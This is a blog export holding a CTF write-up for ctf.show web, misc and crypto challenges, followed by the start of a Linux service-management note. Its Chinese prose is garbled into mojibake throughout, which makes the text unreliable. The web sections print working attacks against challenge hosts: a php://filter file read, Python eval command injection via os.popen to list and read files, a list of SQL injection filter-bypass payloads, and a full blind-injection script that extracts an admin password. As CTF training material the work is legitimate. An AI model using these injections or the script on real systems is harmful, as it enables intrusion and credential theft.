<p>åˆ©ç”¨sprintfå’Œaddslashesçš„æ¼æ´</p>
<p>å‚è€ƒæœçš„ä¸€ç¯‡æ–‡ç« <a href="https://www.jianshu.com/p/3f14bae3396f">ã€PHPã€‘ç”±ä¸€æ¬¡CTFå¼•å‘çš„å­¦ä¹ ç¬”è®°ä¹‹PHPçš„sprintfå‡½æ•°</a></p>
<p>æ‰“å¼€æ˜¯404é¡µé¢,ä½†æ˜¯f12æŸ¥çœ‹çŠ¶æ€ç æ˜¯200,è¯´æ˜æ˜¯å‡çš„404,è€Œä¸”æœ‰phpæ–‡ä»¶æ˜¾ç¤º,f12,å‘ç°htmlé¡µé¢çš„æ³¨é‡Šæç¤º,æŸ¥çœ‹cookies,å‘ç°æ˜¯16è¿›åˆ¶,è½¬æ¢æ˜¯flag.txt,å…ˆè€ƒè™‘ç›´æ¥æ–‡ä»¶åŒ…å«,æç¤ºno flagå†è€ƒè™‘æ ¹æ®åˆ©ç”¨ä¼ªåè®®,å…ˆè¯•äº†base64,æç¤ºno base64,æ¢æˆrot13æˆåŠŸè¯»å–</p>
<p>php://filter/read=string.rot13/resource=/flag</p>
<h3 id="webå‡èµ›ç”Ÿ"><a href="#webå‡èµ›ç”Ÿ" class="headerlink" title="webå‡èµ›ç”Ÿ"></a>webå‡èµ›ç”Ÿ</h3><p>çè’™çš„</p>
<p>é¡µé¢æºä»£ç è¯´è¦ç™»å½•</p>
<p>æ²¡æœ‰è´¦å·,å…ˆæ³¨å†Œ</p>
<p>å…ˆæ³¨å†Œadmin,ä¸å…è®¸</p>
<p>admÄ±n admÄ±n(ä¸æ‡‚åŸç†,çè’™çš„)æ³¨å†Œ,</p>
<p>ç”¨admin adminç™»å½•,æˆåŠŸç™»å½•admin</p>
<p>æ ¹æ®æ­£åˆ™åŒ¹é…,cä¸ä¼ å€¼å°±å¯ä»¥è¿‡</p>
<h3 id="webæ•°æ®åŠæ ¼äº†"><a href="#webæ•°æ®åŠæ ¼äº†" class="headerlink" title="webæ•°æ®åŠæ ¼äº†"></a>webæ•°æ®åŠæ ¼äº†</h3><p>robots.txt,å‘ç°ä½¿ç”¨debug</p>
<p>è®¡ç®—æœº,æŒ‰ä¸ª1+1,å‘ç°æ•°æ®åŒ…,åœ¨æœ€åéšä¾¿åŠ ä¸ªç¬¦å·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1&#123;</span><br></pre></td></tr></table></figure>
<p>å‡ºç°æŠ¥é”™é¡µé¢,æŠ¥é”™æœ€åå‘ç°evalå’Œåˆ¤æ–­</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200306/2bUfP3hLKXdd.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200306/2bUfP3hLKXdd.png?imageslim" alt="mark"></a></p>
<p>æ ¸å¿ƒä»£ç ,åˆšå¼€å§‹æƒ³åˆ©ç”¨åˆ©ç”¨evalåå¼¹shell,ä½†æ˜¯å¤±è´¥äº†</p>
<p>åˆ©ç”¨eval,å¯¼å…¥osåº“,æ‰§è¡Œä»£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1%2Bint(__import__(%27os%27).popen(%22ls%22).read())</span><br></pre></td></tr></table></figure>
<p>åˆ—ç›®å½•åå‘ç°flag.sh,å†è¯»flag.sh</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1%2Bint(__import__(%27os%27).popen(%22cat%20flag.sh%22).read())](http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1%2Bint(__import__(&#39;os&#39;).popen(&quot;cat flag.sh&quot;).read()))</span><br></pre></td></tr></table></figure>
<p>è¯»å–åˆ°çœŸæ­£çš„flagä½ç½®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;0&amp;operator&#x3D;%2B&amp;number2&#x3D;0%2Bint(__import__(&#39;os&#39;).popen(&quot;cat%20&#x2F;home&#x2F;ctf&#x2F;web&#x2F;flag&quot;).read())</span><br></pre></td></tr></table></figure>
<h3 id="web-èŒæ–°è®°å¿†"><a href="#web-èŒæ–°è®°å¿†" class="headerlink" title="web_èŒæ–°è®°å¿†"></a>web_èŒæ–°è®°å¿†</h3><p>dirmapæ‰«ç›®å½•,æ‰«å‡ºåå°ç™»å½•</p>
<p>ç™»å½•admin admin,æç¤ºå¯†ç é”™è¯¯,æ”¹å˜ç”¨æˆ·åæç¤ºç”¨æˆ·å/å¯†ç é”™è¯¯</p>
<p>æ¨æ–­æ˜¯å…ˆåˆ¤æ–­ç”¨æˆ·å,åœ¨åˆ¤æ–­å¯†ç ,å°è¯•å¼±å£ä»¤å¯†ç çˆ†ç ´,githubæ‰¾äº†ä¸¤ä¸ªå­—å…¸10000æ¡æ•°æ®bpæ²¡è·‘å‡ºæ¥,å°è¯•sqlæ³¨å…¥,è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦,å¤§è‡´åˆ¤æ–­äº†ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åˆæ³•</span><br><span class="line">| &#39; , length left &lt; substr ç©ºæ ¼</span><br><span class="line">è¿‡æ»¤</span><br><span class="line">&quot; . or &amp; and ; # + - union select from mid ascii order table &gt; &#x3D;</span><br></pre></td></tr></table></figure>
<p>æ³¨é‡Šç¬¦éƒ½è¿‡æ»¤æ‰äº†,ä½†æ˜¯å•ç»™ä¸€ä¸ªå¼•å·ä¼šæŠ¥é”™,æ‰€ä»¥åº”è¯¥æœ‰æ³¨å…¥æ–¹æ³•</p>
<p>æœæœæ‰¾æ‰¾,æ‰¾åˆ°å‚è€ƒèµ„æ–™<a href="https://segmentfault.com/a/1190000018748071">CTFåˆ©ç”¨ Burpsuite Fuzz å®ç° SQL æ³¨å…¥</a></p>
<p>æ¨æµ‹åº”è¯¥å·®ä¸å¤š,çœ‹æ‡‚ä¹‹å,æµ‹è¯•</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">u&#x3D;&#39;||xxx||&#39;&amp;p&#x3D;123</span><br><span class="line">#ç¬¬ä¸€ä¸ªéšä¾¿å†™çš„,å°è¯•ä¸€ä¸‹å‘ç°æŠ¥é”™,unknown column</span><br><span class="line">#äºæ˜¯å†è¯•</span><br><span class="line">u&#x3D;&#39;||u||&#39;&amp;p&#x3D;123</span><br><span class="line">u&#x3D;&#39;||length(u)&lt;5||&#39;&amp;p&#x3D;123</span><br><span class="line">u&#x3D;&#39;||length(u)&lt;6||&#39;&amp;p&#x3D;123</span><br><span class="line">u&#x3D;&#39;||length(pwd)||&#39;&amp;p&#x3D;123</span><br><span class="line">u&#x3D;&#39;||length(password)||&#39;&amp;p&#x3D;123</span><br><span class="line">u&#x3D;&#39;||length(p)||&#39;&amp;p&#x3D;123</span><br><span class="line">u&#x3D;&#39;||length(p)&lt;17||&#39;&amp;p&#x3D;123</span><br><span class="line">u&#x3D;&#39;||length(p)&lt;18||&#39;&amp;p&#x3D;123</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢è¿™äº›å¯ä»¥å¾—åˆ°ä¸€äº›ä¿¡æ¯,è¡¨ä¸­å­—æ®µæ˜¯u,p,è´¦å·æ˜¯admin,å¯†ç æ˜¯17ä½</p>
<p>ç„¶åå°±æ˜¯åˆ©ç”¨ç›¸åŒåŸç†è¿›è¡Œç›²æ³¨äº†è„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">s&#x3D;requests.session()</span><br><span class="line">url&#x3D;&quot;https:&#x2F;&#x2F;30f04198-23e0-4a0e-a14d-e29e8a13aea6.chall.ctf.show&#x2F;admin&#x2F;checklogin.php&quot;</span><br><span class="line"></span><br><span class="line">def get_length():</span><br><span class="line">    for i in range(1,127):</span><br><span class="line">        postdata &#x3D; &#123;</span><br><span class="line">            &#39;u&#39;:&quot;&#39;||length(p)&lt;&quot;+str(i)+&quot;||&#39;&quot;,</span><br><span class="line">            &#39;p&#39;:&#39;123&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        print(i,postdata)</span><br><span class="line">        r &#x3D; s.post(url,data&#x3D;postdata)</span><br><span class="line">        if &#39;ç”¨æˆ·å&#39;not in r.text:</span><br><span class="line">            print(&quot;get length! length&#x3D;&quot;+str(i-1))</span><br><span class="line">            return i</span><br><span class="line">def get_pwd_char():</span><br><span class="line">    pwd &#x3D; &#39;&#39;</span><br><span class="line">    strs &#x3D; &#39;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">    for i in range(0,length):</span><br><span class="line">        for c in strs:</span><br><span class="line">            postdata &#x3D; &#123;</span><br><span class="line">                &#39;u&#39;:&quot;&#39;||substr(p,&quot;+str(i+1)+&quot;,1)&lt;&#39;&quot;+str(c),</span><br><span class="line">                &#39;p&#39;:&#39;123&#39;</span><br><span class="line">            &#125;</span><br><span class="line">            # print(i,postdata)</span><br><span class="line">            r &#x3D; s.post(url&#x3D;url,data&#x3D;postdata)</span><br><span class="line">            # print(r.text)</span><br><span class="line">            if &#39;ç”¨æˆ·å&#39; not in r.text and &#39;å¯†ç &#39; in r.text:</span><br><span class="line">                pwd +&#x3D; chr(ord(c)-1)</span><br><span class="line">                # print(pwd)</span><br><span class="line">                break</span><br><span class="line">            print(chr(ord(c) - 1),end&#x3D;&#39;&#39;)</span><br><span class="line">        print(&quot;||&quot;+str(i+1),pwd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    length&#x3D;0</span><br><span class="line">    length&#x3D;get_length() #length is 17</span><br><span class="line">    get_pwd_char()</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°å¯†ç ,ç™»å½•å¾—flag</p>
<h3 id="æ‚é¡¹ç­¾åˆ°"><a href="#æ‚é¡¹ç­¾åˆ°" class="headerlink" title="æ‚é¡¹ç­¾åˆ°"></a>æ‚é¡¹ç­¾åˆ°</h3><p>é¡µé¢å¦å­˜ä¸º,winhexæ‰“å¼€,æœ€ä¸‹é¢è¯¡å¼‚çš„20 09,20å˜0,09å˜1,è½¬æ¢æˆäºŒè¿›åˆ¶,äºŒè¿›åˆ¶è½¬ASCIIå‘ç°æ˜¯morse,morseè§£ç ,base16è§£å¯†</p>
<p>å¾—flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;MengMengDa&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ‚é¡¹èŒæ–°ç¦åˆ©"><a href="#æ‚é¡¹èŒæ–°ç¦åˆ©" class="headerlink" title="æ‚é¡¹èŒæ–°ç¦åˆ©"></a>æ‚é¡¹èŒæ–°ç¦åˆ©</h3><p>ä¸‹ä¸‹æ¥,binæ–‡ä»¶,ä¸çŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿,ç™¾åº¦ä¸€ä¸ªæ–‡ä»¶æ ¼å¼åˆ†æ,æ˜¯ABR,ç”¨psæ‰“å¼€,ä¸å…¼å®¹,ç¾¤ä¸»æç¤ºå–å,ç”¨010editorå¯¹åå…­è¿›åˆ¶æŒ‰ä½å–å,ä¿å­˜,å†åˆ†æä¸€ä¸‹,å¯èƒ½æ˜¯MP3,MP4ç”¨potplayæ‰“å¼€,å¬å‡ºflag</p>
<h3 id="æ‚é¡¹qrcode"><a href="#æ‚é¡¹qrcode" class="headerlink" title="æ‚é¡¹qrcode"></a>æ‚é¡¹qrcode</h3><p>è½¬æ¢äºŒç»´ç è„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">MAX &#x3D; 25</span><br><span class="line">img &#x3D; Image.new(&quot;RGB&quot;,(MAX,MAX))</span><br><span class="line">str&#x3D;&quot;1111111011100111101111111100000101011101000100000110111010010010010010111011011101010000110001011101101110101110110110101110110000010011011001010000011111111010101010101111111000000000011100110000000010000011010010111100110111010010110101100001001101100110100100111101111111111111100000000001101101110100101110100101101001011011011001000100100111111100111111111110110010000000010000011110111100110110010111111010110111111000100000000011101111000110101111111010101100101011011100000100011001110001011110111010010111101111101001011101000011101000110111101110100101000110000111010000010000100100100011101111111010110010101011111&quot;</span><br><span class="line">i &#x3D; 0</span><br><span class="line">for y in range (0,MAX):</span><br><span class="line">    for x in range (0,MAX):</span><br><span class="line">        if(str[i] &#x3D;&#x3D; &#39;1&#39;):</span><br><span class="line">            img.putpixel([x,y],(0, 0, 0))</span><br><span class="line">        else:</span><br><span class="line">            img.putpixel([x,y],(255,255,255))</span><br><span class="line">        i &#x3D; i+1</span><br><span class="line">img.show()</span><br><span class="line">img.save(&quot;flag.png&quot;)</span><br></pre></td></tr></table></figure>
<h3 id="æ‚é¡¹-åƒå­—æ–‡"><a href="#æ‚é¡¹-åƒå­—æ–‡" class="headerlink" title="æ‚é¡¹,åƒå­—æ–‡"></a>æ‚é¡¹,åƒå­—æ–‡</h3><p>ç”¨Stegsolveæ‰“å¼€,æ¢æ¢é€šé“çœ‹çœ‹,å¤šç‚¹å‡ ä¸‹,å‘ç°ä¸€ä¸ªå¾ˆå¤šç»†å°äºŒç»´ç çš„å›¾ç‰‡,å¦å­˜ä¸º,</p>
<p>é¦–å…ˆç”¨åˆ‡å‰²è½¯ä»¶åˆ‡äº†,ç»“æœè¯†åˆ«ä¸å‡ºæ¥,å†ç”¨pythonåˆ‡å‰²,è„šæœ¬ç½‘ä¸Šéƒ½æœ‰,æ‰¾ä¸€ä¸ªæ”¹ä¸€æ”¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">filename &#x3D; r&#39;2.bmp&#39;</span><br><span class="line">img &#x3D; Image.open(filename)</span><br><span class="line">for i in range(29):</span><br><span class="line">    for j in range(29):</span><br><span class="line">        region &#x3D; img.crop(25 * j, 25 * i, 25 * (j + 1), 25 * (i + 1))</span><br><span class="line">        region.save(&#39;out&#x2F;&#123;&#125;&#123;&#125;.png&#39;.format(j, i))</span><br></pre></td></tr></table></figure>
<p>å†ç”¨ç¾¤é‡Œå¤§ä½¬åˆ†äº«çš„å¾®å¾®æ‰¹é‡è¯†åˆ«,åœ¨csvæ–‡ä»¶æŸ¥æ‰¾flag</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="å¯†ç å­¦ç­¾åˆ°"><a href="#å¯†ç å­¦ç­¾åˆ°" class="headerlink" title="å¯†ç å­¦ç­¾åˆ°"></a>å¯†ç å­¦ç­¾åˆ°</h3><p>base85å¾—flag</p>
<h3 id="æŠ±æˆ‘"><a href="#æŠ±æˆ‘" class="headerlink" title="æŠ±æˆ‘"></a>æŠ±æˆ‘</h3><p>åˆ†æé€»è¾‘,æ¯11ä½ä½ä¸€ç»„,ç¬¬ä¸€ä½æ˜¯æ²¡ç”¨çš„å­—ç¬¦,å»æ‰ç¬¬ä¸€ä½,å‰©ä¸‹çš„å°±æ˜¯flagä¸­çš„å­—ç¬¦,å…ˆéå†å‡ºflagä¸­çš„å­—ç¬¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">cstring &#x3D; &#39;abcdefghijklmnopqrstuvwxyz&#123;&#125;_0123456789&#39;</span><br><span class="line">key &#x3D; &#39;flag&#123;********&#125;&#39;</span><br><span class="line">length &#x3D; 300</span><br><span class="line"></span><br><span class="line">def encode():</span><br><span class="line">    res &#x3D; &#39;&#39;</span><br><span class="line">    for i in range(1, length):</span><br><span class="line">        c &#x3D; random.randint(0, 36)</span><br><span class="line">        # print(c)</span><br><span class="line">        res +&#x3D; cstring[c]</span><br><span class="line">        # print(res)</span><br><span class="line">        for n in range(10):</span><br><span class="line">            c &#x3D; random.randint(0, len(key) - 1)</span><br><span class="line">            res +&#x3D; key[c]</span><br><span class="line">            # print(res)</span><br><span class="line">    return res</span><br><span class="line"># encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str &#x3D; &quot;qdfl33&#123;6&#123;6gs3afa6&#123;3&#125;agf&#123;&#125;aagdf&#125;6fl36d&#123;dfl&#123;6ay6gafddfg&#125;&#123;j3f&#125;&#125;6la&#123;3&#125;bfdf3&#125;gla&#125;65&#125;lg6g6dflf0&#123;dfgd3fdfgc&#123;g6a&#125;a3&#123;6&#125;mfa&#123;&#125;f&#125;f&#125;&#125;&#125;3363&#125;&#125;f6a6a7g&#123;a&#125;g66&#123;d3xgfffg&#125;a&#125;3&#125;_&#123;lad&#125;a33ga5fd33&#125;&#123;&#123;dl&#125;&#123;&#125;f&#123;3da&#125;g&#125;3egfal&#123;a3l&#125;3f33&#125;dfdda&#123;3sa&#123;d6g&#123;ff&#125;6vgl33d6g333h&#123;gd&#123;&#123;lg6ldg&#123;ad&#123;3333a6oalf6a&#123;33&#123;de3&#123;fa&#125;ggl&#123;abfd&#125;6&#125;6&#125;&#125;l33fa&#125;f&#123;&#123;3&#123;3fla&#125;a6&#125;af&#125;&#123;amg&#125;&#123;&#123;d&#125;&#125;a6gallfg36&#123;g3dh&#123;&#123;&#123;a&#123;lfg3&#123;sll6g6gfaggid6d&#123;3afl&#125;3rff3gfad3d&#125;1dlllff6&#125;6&#125;h3g66gla336b&#123;6d3gf&#125;f&#123;30d63l&#125;3dfl6a3llfgld3&#123;&#125;qg&#125;gf&#125;dg&#123;6l&#125;3gal&#125;agdl6&#123;lg&#123;g&#125;ddfaaealf&#123;f3llgge3ad3&#123;3adf&#123;c&#125;fllf6f&#125;3at&#123;aag&#125;a66d3&#125;ad&#123;dfg&#123;&#125;dlz6gld&#125;6&#123;3flxgf&#123;3g3ald&#125;3g&#125;g63f6ggf3&#125;gfd&#125;f3ga3efllf6&#125;363fu6366fdlggfx6&#125;6l3&#125;&#125;a&#123;afg&#123;&#123;&#125;&#125;3fdaluaa&#125;al&#123;dg3dpfga&#125;&#125;l&#125;d3l4afg&#125;f&#123;d&#123;lgcfgffglal&#125;dq6l&#125;fgflldavdad6&#125;df&#123;&#125;dw&#125;l6g&#125;&#125;&#123;l3gf6fdaa66aadt&#125;f6lg&#123;dg33h&#123;fa3d&#123;&#125;laao3l6aal&#123;lfdv&#123;3dlf6af36bddg&#125;3ggad3o&#125;&#123;&#125;3g3fgddyffd3lddgdd6&#123;gdfl&#123;&#123;la3ild&#125;dg&#123;g&#125;dgef&#123;a3&#123;d6dfgq3adll&#123;fdadt&#125;66fdflg&#123;3x&#123;l3ll&#125;3&#123;&#123;g4a3af6lag3gdaf66dadg6dfglaf66l3f&#123;2&#125;6&#123;afaf&#125;3l6all&#125;&#123;l&#125;lfdla6&#123;fgff&#123;&#125;g13dl&#123;a&#123;6&#123;l6rd6&#125;&#125;l3dgg3_f&#123;66gll&#123;f6a3d3dga6&#123;lg&#125;&#123;g&#125;d&#123;6&#123;d36lll3dd6&#123;3dg3afal&#125;d&#125;gff26&#125;l&#125;al&#125;&#125;&#123;a6&#125;g66gaaff&#125;0fga&#123;g6dfld&#123;&#123;&#125;fglf&#123;af&#125;iddf6g6&#125;l361&#123;ag&#125;&#123;&#123;dlfak&#125;&#123;d3fa&#123;6&#123;godgg&#123;l36a&#123;gmllgfa3fa&#123;&#125;f&#125;&#125;3&#123;a6&#123;a3&#123;nafg&#123;l3d6&#125;g2lf6&#123;gg&#125;&#123;g&#125;sg&#123;ga&#123;63g&#123;&#125;la6g&#123;g6&#123;&#123;63o6&#123;l&#125;&#123;3&#125;l3ag36&#123;af33g3dw6d33f3lfdan&#123;dddad&#123;&#123;6l6&#125;&#125;fad63lgd1ffaa&#125;g&#125;3flkg3d&#125;aalf3lbgf&#123;g&#125;f&#125;&#125;d3agf&#123;ld&#123;dl3l4fl&#123;&#123;3fla&#125;&#125;r3g&#125;&#123;&#125;gda&#123;&#125;_df3g&#125;fa36gq&#125;la&#123;f&#123;6l&#125;66fgdg&#125;6ag6feaal6all3&#123;d&#125;lfgl&#125;&#125;&#123;&#123;6lal&#125;gf&#125;&#125;gfgd4d&#123;g36daff&#125;l6fd63ag6&#125;f7&#125;l3&#123;&#123;d&#125;&#123;al6lff66gda&#125;f7dfaf6&#125;fd3ldfgfl36gf337a6al663afd&#123;dff&#125;6&#125;df&#123;lt&#125;66&#125;ag6a3&#123;na&#125;3la&#123;6daa&#125;63fgldf3ggcl6dd&#123;3fg&#123;&#125;&#125;gfgaf&#123;633lpfadalldgglg&#123;l&#125;&#123;6&#125;gf&#123;agf6&#123;3l3a366wa6l6&#125;fdla&#125;wfl&#125;33&#125;d&#123;6d6aa&#125;laldag&#125;bgaa3gff&#125;3db&#123;gd&#125;lfga3&#123;&#125;ffddd6&#125;&#123;la4&#125;3&#123;agdg3&#123;&#125;bf33adg3a632d&#125;66f&#125;dgd67&#125;&#123;333dfg&#125;&#125;mgg3all3l&#125;fd6dd3&#123;g&#125;&#123;&#125;&#125;v6&#125;a6f6lgd3nfgg6aff3a&#125;d3da&#123;l3ldldz&#123;&#125;&#123;&#125;g3&#125;6fdg6f&#123;gd&#123;g3adx&#123;gll6&#123;fg3dc63lf&#125;6dl&#123;d63f3g&#123;3adda5f3dgfla3&#123;6&#125;gd&#123;3&#123;d6dlldal6g66&#125;&#123;ddp&#125;lalafd&#125;d&#123;lgl&#125;g6g33agjg&#125;33dgf&#125;lg0adlda6gfdlx&#123;3g&#125;&#123;g3a&#123;a76&#125;gdf3la&#125;lh&#125;l&#123;l&#123;&#125;&#125;a6gm&#123;gdd&#123;agg&#125;6xfgg&#125;&#123;336&#125;d_a&#123;df3&#125;df33jgf&#125;6d3&#125;&#125;f&#125;h3l&#123;6ga6fll2&#125;dd&#123;l36d66&#125;ldafdlga3gbgd&#125;d6df&#125;ff1gf6a&#123;ll3a3w&#123;3g&#125;allfafldal&#125;aal&#125;dlra33l3f&#125;3dff&#123;6&#123;6&#125;f&#125;la&#125;lgf&#125;&#125;&#125;gd&#123;f3z3l3&#123;d3636dpl3fag3&#123;faa1&#123;3ga33l&#125;6ll6&#123;gg6&#125;ddf&#125;t6g&#125;&#123;gl6ggl&#123;d&#125;aafalf&#123;lw6a&#123;dad&#125;&#125;a3x&#123;ada&#123;fg6d&#125;a3g&#123;d&#123;fggdawdfal&#123;&#123;3dlfndl636&#125;36alv633ada6gf6hd&#123;3l66ddlfpglda&#125;&#123;g3fdogdfa3&#125;3g&#125;3k3d3gda33&#125;dvd&#125;laa&#123;fa&#123;a&#123;&#123;&#125;a&#125;36&#125;&#125;&#125;&#123;r6d6&#123;a6&#125;&#125;6&#123;0laa36gd&#123;36kf63a&#123;3&#125;gga4af6&#125;f3gfgf0lf&#123;6g&#125;&#123;&#123;6&#125;pafg6dg&#125;g6&#123;b&#125;3d36ad6d&#123;h6f3agff&#125;63p&#125;&#123;l3ag3&#125;lf1f3dgd&#123;66a37&#125;&#125;&#125;d6gglaftaf3l6a3&#123;&#123;a7&#123;lgd3d&#125;fl6tlfl663lgg3wa&#125;33gl&#125;d&#123;3i6aaagl6&#123;&#123;&#125;n3gd&#125;l3l6&#125;l7a&#123;gf&#123;a&#125;l&#125;f3al&#123;alg63fln&#123;&#123;dd&#125;3l&#123;ll1&#125;&#123;3g&#125;6&#123;6&#125;&#123;u63&#123;f3&#123;g6lgf&#123;3d&#125;&#123;636&#125;&#123;u3&#125;&#123;f6d&#123;&#123;d3lg&#123;3l6aldf&#123;i&#123;f366&#123;f3l&#123;eg&#123;d&#123;gll&#123;3dhgdgfgaf&#123;&#125;&#125;g&#125;&#123;lg3&#123;a&#123;flm&#125;fa3ldf&#123;d32fagllf&#123;&#123;66q363&#125;dl66gg2fa6af6d6g37lffl&#123;d&#123;3lltgl33&#125;&#125;&#123;&#125;d3o&#123;lfld3d&#123;&#125;a6a663a66&#123;fabfd6ld333g3rafa&#125;&#125;fddfgt&#123;ggad3ag&#125;lr63af6lgg&#125;gy&#123;6&#123;&#123;6&#125;6dd626&#123;gl6a&#123;ad3b3df&#125;alf3afdaf66ll&#125;lf6jd&#125;3&#123;6dldfgg&#125;f3lg63l&#123;lr3ff3l&#123;gafaa&#125;f&#125;agl6l33xglfggg&#123;&#123;&#123;fq66&#125;g6lfa3&#123;736lllflalglf&#125;&#123;&#125;gf&#123;aggdg3&#123;a&#125;&#125;da&#123;fp6fglla3l&#125;65gf36&#123;l6dl&#125;g&#125;f&#123;la6&#123;l&#123;fpf&#123;&#125;63&#123;f6gdfaalf6&#123;dffgdgf&#123;lgaf&#123;f&#123;56&#125;g6af63l6a&#125;a&#125;&#123;lfa&#123;3gblda&#125;l&#125;&#123;fl&#123;s&#123;g&#125;&#125;6&#123;g6la56g6g3&#123;f&#125;ddfaa&#123;l&#125;dg6g&#125;0glda6&#123;6d&#125;ff&#125;f&#123;6laadd6zaag&#123;l3l&#125;6dc&#125;f3gg&#125;lffgsag&#125;l3l6d3apd3gd3fd&#125;&#125;aga3ga&#125;a3&#123;6f1f3df&#123;&#123;d&#125;&#125;av3laf&#125;6adf3_d&#123;afa6f&#125;adt&#123;faf&#123;d33aaol3&#125;&#123;l&#125;ld&#125;3yl3a6a&#123;fa6&#125;_d33gf3fll&#125;of&#123;6lad&#125;&#125;fdx&#125;6d&#123;f&#125;ll63ugag66d&#123;6f3&#125;33&#125;al6l&#123;ffwf&#123;&#125;&#123;fl3a36ogg3&#123;&#125;&#125;g6&#125;3hl&#125;6dg6ld&#123;digaa&#125;g&#125;&#123;&#123;l&#125;da&#123;ddg3&#123;&#123;d&#125;w3&#125;ld&#125;adgg3m&#123;lad&#123;gd&#123;a&#123;7afff&#125;&#123;d6&#125;fsf3&#123;f&#125;gflgavfldg6a6&#123;ldqf&#125;fd&#123;f3f3&#125;73ddad&#123;666fz6&#125;d&#123;3&#123;l36a1d6fal3fl6lrl&#123;&#125;aga&#123;fdlsa&#125;&#123;6l6ag3gtgdg&#123;6lgf3f&quot;</span><br><span class="line">lengths &#x3D; len(str)</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for i in range(0, lengths):</span><br><span class="line">    if i % 11 !&#x3D; 0:</span><br><span class="line">        if str[i] not in flag:</span><br><span class="line">            flag +&#x3D; str[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p>å†æŠŠç»“æœä¸­çš„å‡ ä¸ªå­—ç¬¦æ‹¼æˆä¸€å¥è¯</p>
<h3 id="å¦ˆå‘€-å®Œäº†"><a href="#å¦ˆå‘€-å®Œäº†" class="headerlink" title="å¦ˆå‘€_å®Œäº†"></a>å¦ˆå‘€_å®Œäº†</h3><p>ç¾¤ä¸»æç¤ºå°±å·®æŠŠç­”æ¡ˆè¯´å‡ºæ¥äº†.äºŒè¿›åˆ¶è½¬asciiå¾—åˆ°å¯†æ–‡,AESåŠ è§£å¯†,å¯†åŒ™æ˜¯20121221å¾—flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>linuxæœåŠ¡ç®¡ç†</title>
    <url>/2020/03/01/Note/linux%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="linuxæœåŠ¡ç®¡ç†"><a href="#linuxæœåŠ¡ç®¡ç†" class="headerlink" title="linuxæœåŠ¡ç®¡ç†"></a>linuxæœåŠ¡ç®¡ç†</h1><h2 id="åœ¨-System-V-SysV-ç³»ç»Ÿä¸­æŸ¥çœ‹è¿è¡Œçš„æœåŠ¡â€”â€”service"><a href="#åœ¨-System-V-SysV-ç³»ç»Ÿä¸­æŸ¥çœ‹è¿è¡Œçš„æœåŠ¡â€”â€”service" class="headerlink" title="åœ¨ System V(SysV)ç³»ç»Ÿä¸­æŸ¥çœ‹è¿è¡Œçš„æœåŠ¡â€”â€”service"></a>åœ¨ System V(SysV)ç³»ç»Ÿä¸­æŸ¥çœ‹è¿è¡Œçš„æœåŠ¡â€”â€”service</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#æ˜¾ç¤ºå…¨éƒ¨</span><br><span class="line">service --status-all</span><br><span class="line">#æ˜¾ç¤ºå¤šæ•°</span><br><span class="line">service --status-all | more</span><br><span class="line">#æ˜¾ç¤ºå°‘æ•°</span><br><span class="line">service --status-all | less</span><br><span class="line">#æ­£åœ¨è¿è¡Œ</span><br><span class="line">service --status-all | grep running</span><br><span class="line">#æŸ¥çœ‹æŒ‡å®šæœåŠ¡</span><br><span class="line">service --status-all | grep httpd</span><br><span class="line">or</span><br><span class="line">service httpd status</span><br></pre></td></tr></table></figure>
<a id="more"></a>

